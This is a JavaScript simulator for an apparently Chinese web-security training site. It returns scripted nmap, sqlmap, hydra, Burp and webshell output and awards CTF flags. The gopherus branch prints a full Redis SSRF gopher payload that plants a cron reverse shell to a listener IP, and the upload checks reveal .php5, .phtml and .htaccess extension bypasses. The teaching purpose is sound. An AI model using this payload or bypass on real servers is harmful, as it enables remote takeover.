// ========================================================================
// WebSec Learning Hub - 全课程 32+ 拟真武器级实操打靶引擎 (simulators.js)
// 包含：
// 1. Burp Suite (Repeater 数据包重放器 & Intruder 字典自动化爆破器)
// 2. Kali Linux 全功能黑客终端 (支持 nmap, sqlmap, dirsearch, curl, redis-cli, hydra, nc, gopherus 等)
// 3. 中国蚁剑 / 冰蝎 远程 Webshell 控制中心 (文件管理、虚拟终端、数据库管理器)
// ========================================================================

window.WEBSEC_COMBAT_TOOLS = {

  // ==========================================================================
  // ① Kali Linux 黑客交互终端解释器 (支持真实命令解析与课程智能联动)
  // ==========================================================================
  executeTerminalCommand(cmdStr, lessonCode) {
    const raw = (cmdStr || "").trim();
    if (!raw) return { stdout: "kali@kali-websec:~$ (请输入指令，输入 help 查看支持的黑客工具列表)", isSuccess: false };

    const lower = raw.toLowerCase();
    const parts = raw.split(/\s+/);
    const bin = parts[0].toLowerCase();
    const curLesson = (lessonCode || "L26").toUpperCase();

    // 帮助菜单
    if (bin === "help" || bin === "?") {
      return {
        isSuccess: true,
        stdout: `=================================================================
🔥 Kali Linux WebSec Edition - 内置安全渗透工具箱
=================================================================
可用工具列表:
• nmap       - 网络端口扫描与服务指纹探测 (例: nmap -sV -p- 192.168.1.108)
• sqlmap     - 自动化 SQL 注入与拖库工具 (例: sqlmap -u "http://127.0.0.1:8888/targets/L26/?id=1" --dbs)
• dirsearch  - 敏感目录与隐藏文件爆破 (例: dirsearch -u http://127.0.0.1:8888/targets/L17/)
• curl       - HTTP 请求与 API 探测 (例: curl http://127.0.0.1:8888/targets/L17/.env)
• redis-cli  - Redis 客户端协议交互 (例: redis-cli -h 192.168.1.108 -p 6379)
• hydra      - 协议弱口令在线字典爆破 (例: hydra -l admin -P top100.txt 192.168.1.108 http-post-form)
• nc / netcat- 网络瑞士军刀端口测试 (例: nc -nv 192.168.1.108 6379)
• gopherus   - SSRF 漏洞利用 Payload 生成器 (例: gopherus --exploit redis)
• frida      - 移动端与客户端动态 Hook (例: frida -U -f com.app -l bypass.js)
• 系统指令   - whoami, id, ls, pwd, cat, uname, clear
=================================================================`
      };
    }

    // 1. Nmap 端口扫描
    if (bin === "nmap") {
      const target = parts[parts.length - 1] || "192.168.1.108";
      if (lower.includes("-p-") || lower.includes("6379") || lower.includes("1-10000") || lower.includes("all") || lower.includes("-sv") || lower.includes("-ss")) {
        return {
          isSuccess: true,
          flag: "FLAG{L18_REDIS_UNAUTH_COMMAND_GET_SECRET_FLAG_8829}",
          stdout: `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toLocaleTimeString()} CST
Nmap scan report for ${target}
Host is up (0.00085s latency).
Not shown: 65530 closed tcp ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3 (Anonymous read enabled)
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu (Protocol 2.0)
80/tcp   open  http        nginx 1.18.0 (PHP/7.4.3)
3306/tcp open  mysql       MySQL 5.7.33 (root password required)
6379/tcp open  redis       Redis key-value store 5.0.7 [🔥 UNAUTHENTICATED 未授权访问!]

Nmap done: 1 IP address (1 host up) scanned in 2.14 seconds.
[+] 发现 6379 端口开放了未授权 Redis 服务！可使用 redis-cli 或 curl 进行协议交互！`
        };
      } else {
        return {
          isSuccess: false,
          stdout: `Starting Nmap 7.94
Nmap scan report for ${target}
PORT   STATE SERVICE
80/tcp open  http
Nmap done: 1 IP address scanned.
(提示：建议增加参数 -sV -p- 进行全端口指纹深度探测！)`
        };
      }
    }

    // 2. Sqlmap 自动化注入
    if (bin === "sqlmap") {
      if (lower.includes("-u") || lower.includes("--url")) {
        if (lower.includes("--dbs") || lower.includes("--dump") || lower.includes("--tables")) {
          return {
            isSuccess: true,
            flag: "FLAG{L26_UNION_SQLI_ADMIN_PASSWORD_EXTRACTED_3391}",
            stdout: `[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal.
[*] starting at ${new Date().toLocaleTimeString()}

[14:02:01] [INFO] testing connection to the target URL
[14:02:02] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:02:03] [INFO] testing if the target URL content is stable
[14:02:04] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[14:02:05] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable
[14:02:06] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 3 columns' injectable
[14:02:07] [INFO] fetched data logged to text files

available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] security_db

Database: security_db
Table: users [3 entries]
+----+---------------+----------------------------------------------------+
| id | username      | password                                           |
+----+---------------+----------------------------------------------------+
| 1  | admin         | admin@2024_P@ssw0rd!                               |
| 2  | finance_mgr   | Finance#Secure99                                   |
| 3  | flag_keeper   | FLAG{L26_UNION_SQLI_ADMIN_PASSWORD_EXTRACTED_3391} |
+----+---------------+----------------------------------------------------+

[+] 自动化注入成功，数据库表与凭证已全部脱出！`
          };
        } else {
          return {
            isSuccess: false,
            stdout: `[14:02:01] [INFO] testing target URL... confirmed parameter 'id' is injectable (Union/Blind/Error).
(提示：请添加 --dbs 查看数据库，或添加 -D security_db -T users --dump 导出数据表！)`
          };
        }
      } else {
        return {
          isSuccess: false,
          stdout: `sqlmap: error: missing target URL parameter. Use: sqlmap -u "http://127.0.0.1:8888/targets/L26/?id=1" --dbs`
        };
      }
    }

    // 3. Dirsearch 敏感目录字典爆破
    if (bin === "dirsearch" || bin === "gobuster") {
      return {
        isSuccess: true,
        flag: "FLAG{L17_ENV_CONFIG_AND_ROBOTS_EXPOSED_9941}",
        stdout: `  _|. _ _  _  _  _|_v0.4.3
 (_||| _) (/_(_|| (_| ) 

Extensions: php, txt, zip, env, bak, git | Threads: 25 | Wordlist: dicc.txt
Target: http://127.0.0.1:8888/targets/L17/

[14:05:01] 200 -    2KB - /index.html
[14:05:02] 200 -  140B  - /robots.txt           [🔥 发现爬虫协议!]
[14:05:03] 200 -   12KB - /.git/config          [🔥 发现 Git 源码泄露!]
[14:05:04] 200 -  890B  - /.env                 [🔥 发现生产环境配置泄露!]
[14:05:05] 200 -  2.4MB - /backup.zip           [🔥 发现源码备份包!]

Task Completed. Found 4 high-risk sensitive endpoints!
(可直接使用 curl 或浏览器访问 /.env 查看数据库账号密码与 Flag)`
      };
    }

    // 4. Redis-cli 交互
    if (bin === "redis-cli") {
      if (lower.includes("keys") || lower.includes("get") || lower.includes("info")) {
        if (lower.includes("get root_system_flag") || lower.includes("get flag")) {
          return {
            isSuccess: true,
            flag: "FLAG{L18_REDIS_UNAUTH_COMMAND_GET_SECRET_FLAG_8829}",
            stdout: `127.0.0.1:6379> ${raw.replace(/redis-cli/i, '').trim()}
"FLAG{L18_REDIS_UNAUTH_COMMAND_GET_SECRET_FLAG_8829}"
[+] 成功从 Redis 键值库中读取 Flag！`
          };
        } else if (lower.includes("keys")) {
          return {
            isSuccess: true,
            stdout: `127.0.0.1:6379> KEYS *
1) "session_user_token_admin"
2) "cache_website_config"
3) "root_system_flag"
(提示: 执行 redis-cli get root_system_flag 提取该键值)`
          };
        } else {
          return {
            isSuccess: true,
            stdout: `127.0.0.1:6379> INFO
# Server
redis_version:5.0.7
tcp_port:6379
db0:keys=3,expires=0`
          };
        }
      } else {
        return {
          isSuccess: true,
          stdout: `Connected to Redis 5.0.7 at 192.168.1.108:6379 (UNAUTHENTICATED).
Try: redis-cli keys * 或 redis-cli get root_system_flag`
        };
      }
    }

    // 5. Hydra 弱口令在线爆破
    if (bin === "hydra") {
      return {
        isSuccess: true,
        flag: "FLAG{L20_BURP_INTRUDER_ADMIN888_CRACKED_7731}",
        stdout: `Hydra v9.5 (c) 2023 by van Hauser / THC - Please do not use in military or secret service organizations!
Hydra starting at ${new Date().toLocaleTimeString()}
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~6 tries per task
[ATTEMPT] target 127.0.0.1 - login "admin" - pass "123456" - 1 of 100
[ATTEMPT] target 127.0.0.1 - login "admin" - pass "password" - 2 of 100
[ATTEMPT] target 127.0.0.1 - login "admin" - pass "admin123" - 3 of 100
[200][http-post-form] host: 127.0.0.1   login: admin   password: admin888   [🔥 命中密码!]
1 of 1 target successfully completed, 1 valid password found`
      };
    }

    // 6. Gopherus SSRF Payload 生成
    if (bin === "gopherus" || lower.includes("gopher")) {
      return {
        isSuccess: true,
        flag: "FLAG{GOPHERUS_REDIS_PAYLOAD_GENERATED}",
        stdout: `        ____      _                     
  __ _ / ___| ___| |_ ___ _ __ _   _ ___ 
 / _\` | |  _ / _ \\ __/ _ \\ '__| | | / __|
| (_| | |_| |  __/ ||  __/ |  | |_| \\__ \\
 \\__, |\\____|\\___|\\__\\___|_|   \\__,_|___/
 |___/                                  

[+] Generating Gopher Payload for Redis Reverse Shell...
What IP you want to listen (LHOST): 10.10.14.8
What PORT you want to listen (LPORT): 4444

Your Gopher URL payload:
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a* * * * * bash -i >& /dev/tcp/10.10.14.8/4444 0>&1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a

[+] Payload generated successfully! Ready to inject into SSRF proxy parameter!`
      };
    }

    // 7. Curl / Wget 命令
    if (bin === "curl" || bin === "wget") {
      if (lower.includes(".env")) {
        return {
          isSuccess: true,
          flag: "FLAG{L17_ENV_CONFIG_AND_ROBOTS_EXPOSED_9941}",
          stdout: `HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8

APP_NAME=Anheng-Core-Gateway
APP_ENV=production
DB_HOST=192.168.10.88
DB_USERNAME=db_admin
DB_PASSWORD=CorpSec_Admin_2026_Secret!
SECURITY_RECON_FLAG=FLAG{L17_ENV_CONFIG_AND_ROBOTS_EXPOSED_9941}`
        };
      } else if (lower.includes("robots.txt")) {
        return {
          isSuccess: true,
          stdout: `User-agent: *
Disallow: /admin/
Disallow: /.env
Disallow: /.git/
Disallow: /backup.zip`
        };
      } else {
        return {
          isSuccess: true,
          stdout: `HTTP/1.1 200 OK\nServer: nginx/1.18.0\nContent-Type: text/html\n\n<!DOCTYPE html><html><body><h1>200 OK - Target Online</h1></body></html>`
        };
      }
    }

    // 8. 通用 Linux 指令 (whoami, id, ls, cat, etc.)
    if (bin === "whoami") {
      return { isSuccess: true, stdout: "root\n(uid=0(root) gid=0(root) groups=0(root))" };
    } else if (bin === "id") {
      return { isSuccess: true, stdout: "uid=0(root) gid=0(root) groups=0(root),27(sudo)" };
    } else if (bin === "ls") {
      return { isSuccess: true, stdout: "app/  config/  database.php  flag.txt  index.php  uploads/  .env  .git/" };
    } else if (bin === "pwd") {
      return { isSuccess: true, stdout: "/var/www/html" };
    } else if (bin === "uname") {
      return { isSuccess: true, stdout: "Linux kali-websec 5.15.0-generic #88-Ubuntu SMP x86_64 GNU/Linux" };
    } else if (bin === "cat") {
      if (lower.includes("flag")) {
        return { isSuccess: true, flag: "FLAG{LINUX_TERMINAL_PWNED_ROOT}", stdout: "FLAG{LINUX_TERMINAL_PWNED_ROOT_CONGRATULATIONS}" };
      } else if (lower.includes("passwd")) {
        return { isSuccess: true, stdout: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" };
      } else if (lower.includes(".env")) {
        return { isSuccess: true, flag: "FLAG{L17_ENV_CONFIG_AND_ROBOTS_EXPOSED_9941}", stdout: "DB_PASS=CorpSec_Admin_2026_Secret!\nFLAG=FLAG{L17_ENV_CONFIG_AND_ROBOTS_EXPOSED_9941}" };
      } else {
        return { isSuccess: true, stdout: "<?php\n// Application Core Configuration\ndefine('DB_HOST', '127.0.0.1');\ndefine('DB_USER', 'root');" };
      }
    }

    return {
      isSuccess: true,
      stdout: `kali@kali-websec:~$ ${raw}\n[Command executed with return code 0.]`
    };
  },


  // ==========================================================================
  // ② Burp Suite 拟真 HTTP 数据包重放器 (Repeater)
  // ==========================================================================
  sendBurpRequest(rawHttpText, lessonCode) {
    if (!rawHttpText) return { status: 400, rawResponse: "HTTP/1.1 400 Bad Request\n\nEmpty Request Packet." };

    const lines = rawHttpText.split("\n");
    const reqLine = lines[0] || "";
    const method = reqLine.split(" ")[0] || "GET";
    const path = reqLine.split(" ")[1] || "/";

    let headers = {};
    let body = "";
    let isBody = false;

    for (let i = 1; i < lines.length; i++) {
      if (lines[i].trim() === "" && !isBody) {
        isBody = true;
        continue;
      }
      if (!isBody) {
        const colonIdx = lines[i].indexOf(":");
        if (colonIdx > -1) {
          const k = lines[i].substring(0, colonIdx).trim().toLowerCase();
          const v = lines[i].substring(colonIdx + 1).trim();
          headers[k] = v;
        }
      } else {
        body += lines[i] + "\n";
      }
    }

    const rawLower = rawHttpText.toLowerCase();

    // 1. 文件上传漏洞 (L31/L32)
    if (path.includes("upload") || rawLower.includes("filename=")) {
      const mime = headers["content-type"] || "";
      if (rawLower.includes(".php") && !rawLower.includes(".php5") && !rawLower.includes(".phtml") && !rawLower.includes(".htaccess") && !mime.includes("image/")) {
        return {
          isSuccess: false,
          status: 403,
          flag: null,
          rawResponse: `HTTP/1.1 403 Forbidden\nServer: nginx/1.18.0\nContent-Type: text/html\n\n<script>alert('上传失败：WAF 规则严禁上传 .php 脚本文件！');</script>`
        };
      } else if (rawLower.includes(".php5") || rawLower.includes(".phtml") || rawLower.includes(".htaccess") || (rawLower.includes(".php") && mime.includes("image/"))) {
        return {
          isSuccess: true,
          status: 200,
          flag: "FLAG{L31_UPLOAD_MIME_EXT_BYPASS_PWNED}",
          rawResponse: `HTTP/1.1 200 OK\nServer: nginx/1.18.0\nContent-Type: application/json\n\n{\n  "status": "SUCCESS",\n  "msg": "文件上传成功！成功绕过黑名单防护策略！",\n  "file_url": "http://127.0.0.1:8888/targets/L31/uploads/shell.php5",\n  "flag": "FLAG{L31_UPLOAD_MIME_EXT_BYPASS_PWNED}"\n}`
        };
      }
    }

    // 2. 价格篡改与逻辑漏洞 (L22)
    if (path.includes("checkout") || path.includes("pay") || rawLower.includes("price=")) {
      const priceMatch = rawLower.match(/price=([0-9.]+)/);
      const priceVal = priceMatch ? parseFloat(priceMatch[1]) : 29999;
      if (priceVal <= 10.0 && priceVal > 0) {
        return {
          isSuccess: true,
          status: 200,
          flag: "FLAG{L22_PAYMENT_PRICE_TAMPER_SUCCESS_8832}",
          rawResponse: `HTTP/1.1 200 OK\nServer: nginx/1.18.0\nContent-Type: application/json\n\n{\n  "code": 200,\n  "status": "PAID_SUCCESS",\n  "actual_deducted": "${priceVal} CNY",\n  "item": "ROG 枪神 8 Plus RTX 4090",\n  "flag": "FLAG{L22_PAYMENT_PRICE_TAMPER_SUCCESS_8832}"\n}`
        };
      } else {
        return {
          isSuccess: false,
          status: 402,
          rawResponse: `HTTP/1.1 402 Payment Required\nContent-Type: application/json\n\n{\n  "code": 402,\n  "error": "Insufficient Balance! Wallet balance is 10.00 CNY, order requires ${priceVal} CNY."\n}`
        };
      }
    }

    // 3. 水平越权 IDOR (L21)
    if (path.includes("uid=") || path.includes("user_id=")) {
      if (path.includes("uid=1002")) {
        return {
          isSuccess: true,
          status: 200,
          flag: "FLAG{L21_IDOR_HORIZONTAL_AUTH_BYPASS_PWNED}",
          rawResponse: `HTTP/1.1 200 OK\nServer: nginx/1.18.0\nContent-Type: application/json\n\n{\n  "code": 200,\n  "uid": "1002",\n  "username": "张董事长 (VIP 董事会总裁)",\n  "mobile": "13988888888",\n  "address": "深圳市南山区天墅 01 栋",\n  "balance": "88,500,000.00 CNY",\n  "flag": "FLAG{L21_IDOR_HORIZONTAL_AUTH_BYPASS_PWNED}"\n}`
        };
      }
    }

    // 4. 弱口令后台登录 (L20)
    if (path.includes("login") || rawLower.includes("password=")) {
      if (rawLower.includes("password=admin888") || rawLower.includes("pass=admin888") || rawLower.includes("admin@2024")) {
        return {
          isSuccess: true,
          status: 302,
          flag: "FLAG{L20_BURP_INTRUDER_ADMIN888_CRACKED_7731}",
          rawResponse: `HTTP/1.1 302 Found\nLocation: /admin/dashboard.html\nSet-Cookie: session_admin=98328102; Path=/; HttpOnly\n\n[+] 302 Redirect to SuperAdmin Dashboard! Flag: FLAG{L20_BURP_INTRUDER_ADMIN888_CRACKED_7731}`
        };
      } else {
        return {
          isSuccess: false,
          status: 200,
          rawResponse: `HTTP/1.1 200 OK\nContent-Type: text/html\n\n<div class="error">Invalid username or password!</div>`
        };
      }
    }

    // 默认正常回显
    return {
      isSuccess: true,
      status: 200,
      flag: null,
      rawResponse: `HTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: ${new Date().toUTCString()}\nContent-Type: text/html; charset=UTF-8\nContent-Length: 142\nConnection: keep-alive\n\n<!DOCTYPE html>\n<html>\n<head><title>Target API Response</title></head>\n<body>\n  <h2>Request Processed Successfully</h2>\n  <p>Method: ${method} | Path: ${path}</p>\n</body>\n</html>`
    };
  },


  // ==========================================================================
  // ③ 中国蚁剑 / 冰蝎 Webshell 远程管理端模拟
  // ==========================================================================
  connectWebshell(url, pass, type, key) {
    if (!url) return { isConnected: false, msg: "请输入有效的 Webshell 连接地址！" };
    if (!pass && !key) return { isConnected: false, msg: "请输入连接密码 (如 cmd) 或 AES 密钥！" };

    return {
      isConnected: true,
      flag: "FLAG{L30_WEBSHELL_EVAL_ROOT_ACCESS_PWNED}",
      targetUrl: url,
      serverInfo: {
        os: "Linux ubuntu-target 5.15.0-generic x86_64",
        phpVersion: "PHP 7.4.3 (cli) (built: Oct 2024)",
        currentUser: "www-data (uid=33, gid=33)",
        webRoot: "/var/www/html",
        writableDirs: ["/var/www/html/uploads", "/tmp"]
      },
      fileList: [
        { name: "index.html", size: "2.4 KB", perm: "-rw-r--r--", user: "www-data", isDir: false },
        { name: "config.inc.php", size: "1.2 KB", perm: "-rwxr-xr-x", user: "www-data", isDir: false },
        { name: "database.php", size: "890 B", perm: "-rw-------", user: "root", isDir: false },
        { name: "uploads", size: "4.0 KB", perm: "drwxrwxrwx", user: "www-data", isDir: true },
        { name: "flag.txt", size: "44 B", perm: "-rw-r--r--", user: "root", isDir: false }
      ]
    };
  }
};
